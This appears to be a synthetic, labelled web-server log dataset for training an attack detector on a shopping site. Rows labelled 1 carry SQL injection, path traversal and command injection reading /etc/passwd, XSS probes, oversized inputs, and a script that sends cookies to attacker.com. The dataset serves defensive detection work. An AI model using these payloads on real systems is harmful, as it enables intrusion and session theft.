+07:37:55.0,10.0.0.195,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:37:56.8,192.168.1.165,GET,/,,0
+07:37:59.3,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:38:01.4,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:38:03.3,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:38:05.2,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:38:07.2,192.168.1.144,POST,/auth/login,"{'csrf_token': 'ImTVkCDrmitaB0yXbS21wSviZwcokkZscfMZI90GiM'.bfPPGleK.MdkqpGJdxyY_dg68JhA4LnsjEUxT, 'username': 'user12', 'password': 'gPxHRc#jNcJ4', 'submit': 'Log in'}",0
+07:38:09.4,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:38:11.0,192.168.1.197,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:38:13.5,10.0.0.67,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:38:14.9,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:38:17.0,192.168.1.104,POST,/auth/register,"{'csrf_token': 'Im9hA4OroHCeuXpH39u0z4pJ2aI5pIIIr096wRuja7'.R0I3EIwx.8HQtLpCa3YsbkaeMw147F8FC8CXt, 'username': 'newuser28', 'email': 'a94@b.com', 'password': '92h2U@5DdETl', 'submit': 'Register'}",0
+07:38:19.2,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:38:21.1,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:38:22.8,192.168.1.12,POST,/search,{'query': 'iphone 15 pro max'},0
+07:38:25.3,203.162.4.190,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:38:26.9,192.168.1.22,POST,/auth/login,"{'csrf_token': 'ImBySLJSkoyzL4io4z9Bkt05Rv8cPjIiSnQH8QUrnC'.fHfCf8Ta.IKLHlShGnuy9qK-m8Iw0-6PrjTSL, 'username': 'user61', 'password': '5Kp)k)FDio09', 'submit': 'Log in'}",0
+07:38:29.1,192.168.1.185,POST,/search,{'query': 'iphone 15 pro max'},0
+07:38:30.9,203.162.4.191,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:38:33.3,192.168.1.197,GET,/,,0
+07:38:34.9,192.168.1.141,GET,/product/1,,0
+07:38:37.4,192.168.1.167,GET,/order/myorders,,0
+07:38:38.8,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:38:41.5,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:38:43.3,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:38:45.7,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:38:46.9,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:38:49.1,10.0.0.176,POST,/search,{'query': 'iphone 15 pro max'},0
+07:38:51.1,203.162.4.190,POST,/auth/register,"{'csrf_token': 'ImTbVBf3SR3pRQqjVd1oVVhPhlpd2BOIkNy30Om4Uf'.pP5fuixC.2lES5anCVvxbNtAqBMpuIcy_ojjR, 'username': 'newuser32', 'email': 'a42@b.com', 'password': '#i7gNVTdwIhg', 'submit': 'Register'}",0
+07:38:53.2,127.0.0.1,GET,/,,0
+07:38:55.3,192.168.1.197,GET,/auth/login,,0
+07:38:57.2,192.168.1.165,GET,/auth/register,,0
+07:38:59.7,192.168.1.46,POST,/search,{'query': 'iphone 15 pro max'},0
+07:39:01.0,203.162.4.191,POST,/auth/register,"{'csrf_token': 'ImY9mRsb6g8Gz625MI9eVmxruF0JhyCQn87uNnlBJ1'.IlzrfHiM.oHzwfVYP1rE91PDcYg8SnX4m4q9Z, 'username': 'newuser58', 'email': 'a65@b.com', 'password': 'LLs7CI^wmF0)', 'submit': 'Register'}",0
+07:39:03.0,127.0.0.1,POST,/auth/register,"{'csrf_token': 'ImsUVQzyfQhBqi8zdfoSlu0dNqoOtKFgsZbIZhBpYZ'.I263Qw3C.0na9b4IgpP8xRc0QEih5RHb1154M, 'username': 'newuser13', 'email': 'a46@b.com', 'password': 'zDorVxtIsFv1', 'submit': 'Register'}",0
+07:39:05.1,192.168.1.144,POST,/auth/register,"{'csrf_token': 'ImOVa1414bzq9pcZqsEour38iDzEGdhti2V5brsERM'.as55VgOR.ruM8fLRsbv4QBN6zuJnV3bks7EUV, 'username': 'newuser89', 'email': 'a39@b.com', 'password': 'BD29G%MjmzPf', 'submit': 'Register'}",0
+07:39:06.9,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+07:39:09.0,192.168.1.22,GET,/auth/logout,,0
+07:39:11.3,10.0.0.146,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:39:12.9,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:39:15.1,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:39:17.5,192.168.1.18,POST,/auth/register,"{'csrf_token': 'ImcZEQhvxIw27jkLESSt5SaEUcw7RZRhJNPOhplgkA'.IXr3A964.J4tFMvIegHz_0cvWkfQFvZpxmiH7, 'username': 'newuser74', 'email': 'a34@b.com', 'password': 'Dxz2t82OD4q$', 'submit': 'Register'}",0
+07:39:19.2,192.168.1.18,GET,/product/1,,0
+07:39:21.0,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:39:22.8,192.168.1.50,GET,/order/myorders,,0
+07:39:25.6,192.168.1.197,GET,/order/myorders,,0
+07:39:27.3,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:39:29.6,10.0.0.67,GET,/auth/register,,0
+07:39:31.0,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:39:33.7,10.0.0.79,GET,/order/cart,,0
+07:39:35.5,10.0.0.28,GET,/product/1,,0
+07:39:37.4,192.168.1.165,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:39:39.0,192.168.1.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:39:40.9,103.75.118.228,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:39:43.5,203.162.4.190,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:39:45.6,10.0.0.66,POST,/auth/login,"{'csrf_token': 'Im88eUAnP8dYqgMFK13cR5jTmNVR9BHpziVq9R5lra'.qdMDe8yh.ZSE0igyha09xoBKWm2cdfBhljf6z, 'username': 'user36', 'password': 'mT&z8Mu@VVx2', 'submit': 'Log in'}",0
+07:39:47.5,192.168.1.18,GET,/,,0
+07:39:49.0,127.0.0.1,GET,/order/myorders,,0
+07:39:51.4,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:39:53.3,192.168.1.185,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:39:55.1,192.168.1.162,GET,/order/myorders,,0
+07:39:57.4,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:39:59.6,192.168.1.169,GET,/auth/register,,0
+07:40:01.2,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:40:03.6,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+07:40:05.7,192.168.1.197,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:40:07.4,192.168.1.22,GET,/product/2,,0
+07:40:09.2,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:40:11.4,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:40:13.5,10.0.0.106,GET,/auth/register,,0
+07:40:15.2,192.168.1.197,GET,/product/2,,0
+07:40:17.2,192.168.1.167,POST,/auth/register,"{'csrf_token': 'ImvTusjlDBBJtl9QpBS9T535TyGJyoe2ltW9oqcCw4'.zQt3zSpT.4ZpxrL62XZy2q2E-qMf4IdzOR_TB, 'username': 'newuser72', 'email': 'a82@b.com', 'password': 'VofyN7tl5V8M', 'submit': 'Register'}",0
+07:40:19.4,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:40:21.7,10.0.0.176,GET,/auth/login,,0
+07:40:23.1,192.168.1.167,GET,/category/Iphone,,0
+07:40:25.4,192.168.1.162,POST,/auth/register,"{'csrf_token': 'ImDlMH7gs8GzRp0QhVy5Q9Ue3lBmhAJ5W0nJbJP3np'.ggmJHRBA.pYmgPV0ds_GZvIdPvCWBaUXkTwkr, 'username': 'newuser73', 'email': 'a77@b.com', 'password': 'LRk3RNR3Rz1q', 'submit': 'Register'}",0
+07:40:27.3,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:40:29.5,192.168.1.12,GET,/order/cart,,0
+07:40:31.5,192.168.1.12,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:40:33.3,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+07:40:34.8,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:40:37.1,203.162.4.190,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:40:38.9,10.0.0.106,POST,/auth/login,"{'csrf_token': 'ImEtNTZ872amepFGr6enmMSAhS1Fh8k7nGBTRupE0F'.6iAbBopq.nlMb_NXRWvn9PP6DAuSjbf3bVwPO, 'username': 'user42', 'password': 'SM@QOoQZ%DMD', 'submit': 'Log in'}",0
+07:40:41.0,192.168.1.169,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:40:43.5,203.162.4.191,GET,/product/1' AND 1=1,,1
+07:40:45.1,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:40:47.4,192.168.1.197,GET,/auth/register,,0
+07:40:49.2,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+07:40:51.7,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:40:52.8,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:40:55.5,203.162.4.190,POST,/search,{'query': 'iphone 15 pro max'},0
+07:40:57.2,10.0.0.82,POST,/auth/register,"{'csrf_token': 'Imb3e7Dpw4YHBN3DDiP6Wzis5JCR1bQcGflxVDP2pe'.m0Qqkxpp.HY4qqHofayc_u-kiAWYtrow3qUHZ, 'username': 'newuser37', 'email': 'a46@b.com', 'password': 'c1gG)xjRY76P', 'submit': 'Register'}",0
+07:40:58.8,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+07:41:00.8,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:41:02.9,192.168.1.56,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:41:05.2,192.168.1.185,POST,/search,{'query': 'iphone 15 pro max'},0
+07:41:06.9,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+07:41:09.4,10.0.0.67,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:41:11.3,192.168.1.144,POST,/auth/login,"{'csrf_token': 'ImpyW27j7B7VPEvpCQCw456AW5V6m9ZMKUGecz8wFG'.TaZJBtNN.vCNAfEEex9ucT_EtPbitCbSx5aZn, 'username': 'user5', 'password': 'j@CLyV(sfMUC', 'submit': 'Log in'}",0
+07:41:13.5,10.0.0.28,POST,/auth/register,"{'csrf_token': 'Imz122fATvY8AR7QPUsbs8JLdDJNuWaFczG0hb7BZq'.4gICuba1.daUYFy1k8z3ycBjHqLv6g_BvYG5x, 'username': 'newuser29', 'email': 'a25@b.com', 'password': 'J9&dOgCT1C1)', 'submit': 'Register'}",0
+07:41:15.7,192.168.1.167,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:41:17.2,192.168.1.104,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:41:19.2,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+07:41:21.1,10.0.0.195,GET,/product/2,,0
+07:41:23.3,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:41:25.6,192.168.1.182,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:41:27.2,192.168.1.104,POST,/auth/login,"{'csrf_token': 'ImRTDlhx83qDcK0LHJhi7qerdxOl321hKNmV9zz2ny'.ffRkf49I.qER3r6w67M2R8eSThEW62db-fp6U, 'username': 'user24', 'password': 'fBLOqLC^dui#', 'submit': 'Log in'}",0
+07:41:28.8,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:41:31.4,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:41:33.2,192.168.1.12,POST,/auth/register,"{'csrf_token': 'ImWYjEimQ2FOAt00mHllSUL5ZxcFj7r6N28s9ZLoYS'.ciweRSl7.UKDJHcUAuM4Y6yauEpJk4dzywFww, 'username': 'newuser32', 'email': 'a96@b.com', 'password': '%lCktmeAA$v2', 'submit': 'Register'}",0
+07:41:35.6,192.168.1.175,GET,/product/1,,0
+07:41:37.2,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:41:38.9,10.0.0.106,GET,/product/1,,0
+07:41:40.9,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+07:41:43.3,192.168.1.50,GET,/order/myorders,,0
+07:41:44.8,192.168.1.197,POST,/search,{'query': 'iphone 15 pro max'},0
+07:41:47.6,192.168.1.56,POST,/auth/register,"{'csrf_token': 'ImCMYuqjwicARKjywu8n6jqz7Rr3TyPjJ5l7KMOOC8'.9CP0iz2g.yUjNSk0k1qOlJX3CI_6VaJsfV_A4, 'username': 'newuser95', 'email': 'a4@b.com', 'password': 'A*XJ6WeoGDvM', 'submit': 'Register'}",0
+07:41:48.9,192.168.1.141,POST,/search,{'query': 'iphone 15 pro max'},0
+07:41:51.4,192.168.1.50,GET,/,,0
+07:41:53.6,10.0.0.146,GET,/auth/register,,0
+07:41:54.9,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:41:57.0,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:41:59.0,192.168.1.182,POST,/auth/register,"{'csrf_token': 'ImMxLmNiwJQHwUR1Hps7UT4QrXKG55ulpfsJokURbw'.s7FNOfAT.0E6-rJzIoUo7JmTPuCrQ7fbf_cMm, 'username': 'newuser97', 'email': 'a32@b.com', 'password': 'VT%)yIigmBSa', 'submit': 'Register'}",0
+07:42:01.4,203.162.4.191,GET,/product/1,,0
+07:42:03.0,192.168.1.46,POST,/auth/login,"{'csrf_token': 'ImGJwamgTS6UcapqKdel3fkV4613LLhBtiXRoydnv3'.cPIWGGDr.D9l8GwjokZBKwkvhs5ArLp2tGytI, 'username': 'user88', 'password': 'PAhH0pEJp8wS', 'submit': 'Log in'}",0
+07:42:05.3,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:42:07.0,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:42:09.4,10.0.0.195,POST,/auth/register,"{'csrf_token': 'ImbOZamW0gXKr7DIjeMCKt7GqSyt96ohxUvL3uDow4'.7BdcTe2I.1LAWpf7jC-8L9SxFSUC591tGnWjm, 'username': 'newuser71', 'email': 'a94@b.com', 'password': 'UbQSXfhwDtpe', 'submit': 'Register'}",0
+07:42:11.2,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:42:13.7,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:42:14.9,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:42:17.4,192.168.1.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:42:19.7,203.162.4.191,GET,/category/Iphone,,0
+07:42:21.3,203.162.4.190,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:42:23.1,192.168.1.56,GET,/auth/register,,0
+07:42:25.7,192.168.1.50,POST,/search,{'query': 'iphone 15 pro max'},0
+07:42:26.8,192.168.1.56,POST,/auth/register,"{'csrf_token': 'ImKGGYy07lWhvlHmzSZUY54DAcMR3Yk5IS1xJf7Ecm'.cYndQYkV.3hWX_87Si5blenLpnD6kp0VdsW_B, 'username': 'newuser3', 'email': 'a6@b.com', 'password': 'TqjeLqltFmW^', 'submit': 'Register'}",0
+07:42:29.6,192.168.1.165,POST,/auth/login,"{'csrf_token': 'Imy4HGSnIJMEJWTkGUFP47Gw8BPIXnQkT4U1Ta2RhN'.Qis6K5wB.zsvfv0hEouYU8yjQobPkwGs2d-Ls, 'username': 'user65', 'password': '4i)Jx53#a)y@', 'submit': 'Log in'}",0
+07:42:31.0,10.0.0.28,POST,/search,{'query': 'iphone 15 pro max'},0
+07:42:33.0,192.168.1.50,POST,/search,{'query': 'iphone 15 pro max'},0
+07:42:35.3,192.168.1.50,POST,/auth/login,"{'csrf_token': 'ImWNzI4Y78ed8wTFOqhNBhcYY5sBnKoR042QsL6zOc'.vvcxvQrH.R2Ikf7asZyF5rEf1pdhNglODXCW2, 'username': 'user75', 'password': 'QWd9(T3$x$za', 'submit': 'Log in'}",0
+07:42:37.5,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:42:39.4,10.0.0.79,POST,/auth/login,"{'csrf_token': 'ImiHqGXiqipfNCDC87GJcCNsLyPyFnh55UP6FMZLTG'.UqjGFunA.z3isuifnXS0V7HrfbjOCp7yHs4ks, 'username': 'user25', 'password': 'Vy6D^8Pg6Fun', 'submit': 'Log in'}",0
+07:42:40.9,192.168.1.175,POST,/auth/login,"{'csrf_token': 'ImTHSGIjZAntCMYLV4BE4T5foYIeoqHCssoVaHlCKo'.NCLvjydW.sIjx_mPnfoqSZmFnujpSnWxSeCga, 'username': 'user54', 'password': 'GotwO@Po!)v2', 'submit': 'Log in'}",0
+07:42:43.5,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:42:45.0,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:42:47.3,192.168.1.182,POST,/search,{'query': 'iphone 15 pro max'},0
+07:42:49.5,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+07:42:51.4,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:42:52.8,192.168.1.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:42:55.3,192.168.1.175,GET,/order/myorders,,0
+07:42:57.6,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:42:59.4,10.0.0.79,POST,/auth/login,"{'csrf_token': 'Im1xCxDGlavo6gZc1cwiUDJl0FwOYsiwvUUltN7SJb'.juz6hE7t.CwSOHnDNGZbBdtjAZnlIuaPysFa1, 'username': 'user81', 'password': ')PurHXssVOKQ', 'submit': 'Log in'}",0
+07:43:01.0,10.0.0.195,GET,/auth/logout,,0
+07:43:03.5,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:43:05.6,10.0.0.195,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:43:07.6,10.0.0.195,POST,/auth/login,"{'csrf_token': 'ImqNbIt8Rom6VLf5CRo2LqJzD1uJNLukEjkffTvqjO'.nTma1Cpy.y62EHiNj-vwDc0YLxkFtkBoCWzps, 'username': 'user13', 'password': 'hcMclf4XqBj%', 'submit': 'Log in'}",0
+07:43:09.3,203.162.4.190,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:43:11.7,10.0.0.67,GET,/product/2,,0
+07:43:13.1,192.168.1.18,POST,/auth/register,"{'csrf_token': 'ImosZV9Dj8lmOTtQCC8Ywx14TLiAPfJn1ygUt6J8qq'.CtmUTBTu.PVg5I95KcaCRLTr9pTZqktr741Xk, 'username': 'newuser13', 'email': 'a50@b.com', 'password': 'OnutE51MSIiC', 'submit': 'Register'}",0
+07:43:15.2,192.168.1.22,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:43:17.3,192.168.1.169,GET,/product/1,,0
+07:43:18.8,192.168.1.165,GET,/product/2,,0
+07:43:21.6,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:43:23.5,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:43:25.0,10.0.0.106,POST,/auth/login,"{'csrf_token': 'ImTCMWZfEH6FXPYXYhwq5blcdv5P68PCuLmSIr0h6Z'.TSgA7EuY.Nzvl7Y9Bxgvv7wGJeUrIsEzzgRyU, 'username': 'user54', 'password': 's^dO84CiIw6c', 'submit': 'Log in'}",0
+07:43:27.5,10.0.0.106,POST,/auth/login,"{'csrf_token': 'Im4SGeflZdm2GaUl86IyeGLKVNpSosWRKOwbEx2rNY'.1ATdiQgb.6-1hmmgnmKf9co7jHPX4TzkjY9dt, 'username': 'user32', 'password': 'WCnxTc0sdWA2', 'submit': 'Log in'}",0
+07:43:29.7,192.168.1.169,GET,/auth/login,,0
+07:43:31.7,192.168.1.144,POST,/auth/register,"{'csrf_token': 'ImyEqXfhfINfrk5HIXGobcfJngakQG6Bk0rKDNeQ44'.2cso58Ao.pbQoE33RgKeDoqNUDKhMuDlEg9nb, 'username': 'newuser36', 'email': 'a91@b.com', 'password': 'cMyUVhKTu2Ow', 'submit': 'Register'}",0
+07:43:33.2,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:43:35.7,192.168.1.167,GET,/order/myorders,,0
+07:43:37.0,192.168.1.12,GET,/auth/register,,0
+07:43:39.5,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:43:41.4,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:43:43.1,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:43:45.2,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:43:47.5,10.0.0.28,POST,/search,{'query': 'iphone 15 pro max'},0
+07:43:49.2,192.168.1.175,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:43:51.4,192.168.1.151,GET,/order/myorders,,0
+07:43:52.8,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:43:54.8,192.168.1.197,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:43:57.4,192.168.1.162,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:43:59.7,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:44:01.5,192.168.1.167,GET,/order/myorders,,0
+07:44:03.6,10.0.0.15,POST,/auth/login,"{'csrf_token': 'ImNBwYRq0sD0nVR2riiZyRVNZ8dEkO0ieVLHyHVFKv'.rYEht3rz.HOsWmNsgO4ryATcJHR-MWZhvdL6c, 'username': 'user56', 'password': '7BhmrboFxqWN', 'submit': 'Log in'}",0
+07:44:05.1,192.168.1.165,GET,/auth/login,,0
+07:44:07.3,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:44:09.4,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:44:11.2,192.168.1.46,GET,/auth/login,,0
+07:44:13.2,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:44:15.0,203.162.4.191,GET,/product/1' AND 1=1,,1
+07:44:17.5,192.168.1.50,POST,/search,{'query': 'iphone 15 pro max'},0
+07:44:19.0,192.168.1.50,GET,/auth/register,,0
+07:44:21.3,192.168.1.56,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:44:23.7,10.0.0.28,GET,/order/myorders,,0
+07:44:25.0,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+07:44:27.1,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:44:29.2,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
